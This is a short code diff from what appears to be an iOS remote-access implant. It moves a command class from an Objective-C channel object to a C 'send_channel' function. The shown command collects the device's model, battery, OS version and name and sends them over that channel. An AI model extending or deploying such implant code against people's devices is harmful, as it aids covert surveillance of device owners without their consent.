@@ -22,11 +22,11 @@
 * SOFTWARE.
 */
 
+#include "channel.h"
 #import "ios_commands.h"
 
 @implementation Commands
 
-@synthesize channel;
 @synthesize fileManager;
 
 NSString *process = @"%bold%blue[*]%end ";
@@ -42,7 +42,6 @@ NSString *information = @"%bold%white[i]%end ";
     fileManager = [[NSFileManager alloc]  init];
     [fileManager changeCurrentDirectoryPath:NSHomeDirectory()];
 
-    channel = [[Channel alloc] init];
     return self;
 }
 
@@ -53,7 +52,7 @@ NSString *information = @"%bold%white[i]%end ";
     NSString *sysinfo = [NSString stringWithFormat:@"%@Model: %@\n%@Battery: %d\n%@Version: %@\n%@Name: %@\n",
                         information, [device model], information, batinfo, information, [device systemVersion], information, [device name]];
 
-    [channel sendChannel:channelPipe withData:sysinfo];
+    send_channel(channel, [sysinfo UTF8String]);
 }
 
 -(void)cmd_getpid {
